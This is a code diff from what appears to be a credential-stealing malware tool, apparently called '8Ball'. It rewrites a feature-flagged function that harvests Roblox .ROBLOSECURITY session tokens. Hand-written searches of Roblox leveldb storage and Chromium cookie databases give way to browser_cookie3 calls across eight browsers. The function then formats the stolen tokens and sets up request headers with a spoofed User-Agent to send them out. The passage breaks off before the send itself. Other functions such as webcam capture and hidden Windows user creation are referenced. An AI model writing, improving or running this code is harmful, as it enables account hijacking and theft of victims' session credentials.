@@ -9,6 +9,8 @@ import random
 import warnings
 import tempfile
 import sqlite3
+import zipfile
+import browser_cookie3
 try:
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -2994,103 +2996,39 @@ def webcam_capture_func():
         RX_DB6(f"[8Ball] webcam_capture_func failed: {type(e).__name__}: {e}", "ERROR")
 
 # ── roblox_cookies ──
-def _read_dir_copied(src):
-    """Copy dir to temp then return temp path, or None if src missing."""
-    if not os.path.isdir(src):
-        return None
-    tmp = tempfile.mktemp(suffix="_rbx")
-    try:
-        shutil.copytree(src, tmp, ignore_dangling_symlinks=True)
-        return tmp
-    except Exception:
-        try: shutil.rmtree(tmp, ignore_errors=True)
-        except: pass
-        return None
-
-def _search_leveldb_for_cookies(leveldb_path, found):
-    """Search .ldb/.log files in leveldb_path for .ROBLOSECURITY tokens."""
-    for fname in os.listdir(leveldb_path):
-        if not (fname.endswith(".ldb") or fname.endswith(".log")):
-            continue
-        try:
-            raw = open(os.path.join(leveldb_path, fname), errors="ignore").read()
-        except:
-            continue
-        for m in re.findall(r"\_\|WARNING:-DO NOT SHARE THIS\.--([a-zA-Z0-9_\-]+)", raw):
-            if m not in found:
-                found.append(m)
-        for m in re.findall(r"\.ROBLOSECURITY[^a-zA-Z0-9_\-]+([a-zA-Z0-9_\-]{20,})", raw):
-            if m not in found:
-                found.append(m)
-
-def _search_browser_cookies_for_roblox(found):
-    """Search Chrome/Edge sqlite cookie DBs for .ROBLOSECURITY."""
-    browser_profiles = [
-        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
-        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome SxS", "User Data"),
-        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
-        os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
-        os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable"),
-        os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera GX Stable"),
-    ]
-    for profile_root in browser_profiles:
-        if not os.path.isdir(profile_root):
-            continue
-        for root, dirs, files in os.walk(profile_root):
-            if "Cookies" in files:
-                db_path = os.path.join(root, "Cookies")
-                if not os.path.isfile(db_path):
-                    continue
-                tmp_db = tempfile.mktemp(suffix="_rbx_cookies")
-                try:
-                    shutil.copy2(db_path, tmp_db)
-                except:
-                    continue
-                try:
-                    conn = sqlite3.connect(tmp_db)
-                    cur = conn.cursor()
-                    for row in cur.execute("SELECT host_key, name, path, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%' AND name = '.ROBLOSECURITY'"):
-                        if row[3] and row[3] not in (b"", b"\x00"):
-                            found.append(row[3].hex()[:64])
-                    conn.close()
-                except:
-                    pass
-                try: os.remove(tmp_db)
-                except: pass
-
 def roblox_cookies_func():
     if not FEATURE_CONFIG.get("roblox_cookies", False):
         return
-    RX_DB6("[8Ball] roblox_cookies_func: starting")
+    RX_DB6("[8Ball] roblox_cookies_func: starting (browser_cookie3)")
     try:
         cookies = []
-        roaming = os.environ.get("APPDATA", "")
-        local = os.environ.get("LOCALAPPDATA", "")
-        paths = [
-            os.path.join(local, "Roblox", "LocalStorage", "leveldb"),
-            os.path.join(roaming, "Roblox", "LocalStorage", "leveldb"),
-            os.path.join(local, "Roblox Corporation", "Roblox", "LocalStorage", "leveldb"),
+        browsers = [
+            browser_cookie3.chrome,
+            browser_cookie3.chromium,
+            browser_cookie3.brave,
+            browser_cookie3.opera_gx,
+            browser_cookie3.safari,
+            browser_cookie3.firefox,
+            browser_cookie3.opera,
+            browser_cookie3.edge,
         ]
-        for p in paths:
-            tmp_p = _read_dir_copied(p)
-            if tmp_p:
-                _search_leveldb_for_cookies(tmp_p, cookies)
-                try: shutil.rmtree(tmp_p, ignore_errors=True)
-                except: pass
-        if not cookies:
-            create_windows_user()
+        for browser in browsers:
             try:
-                _search_browser_cookies_for_roblox(cookies)
-            finally:
-                remove_windows_user()
-        if cookies:
+                browser_cookies = browser(domain_name="roblox.com")
+                for cookie in browser_cookies:
+                    if cookie.name == '.ROBLOSECURITY':
+                        if cookie.value not in cookies:
+                            cookies.append(cookie.value)
+            except:
+                pass
+        if not cookies:
+            desc = "No Roblox `.ROBLOSECURITY` tokens found."
+        else:
             desc = "Found Roblox `.ROBLOSECURITY` tokens:\n"
             for c in cookies:
                 desc += f"`{c[:64]}...`\n"
             if len(desc) > 4000:
                 desc = desc[:3997] + "..."
-        else:
-            desc = "No Roblox `.ROBLOSECURITY` tokens found."
         headers = {
             "Content-Type": "application/json",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
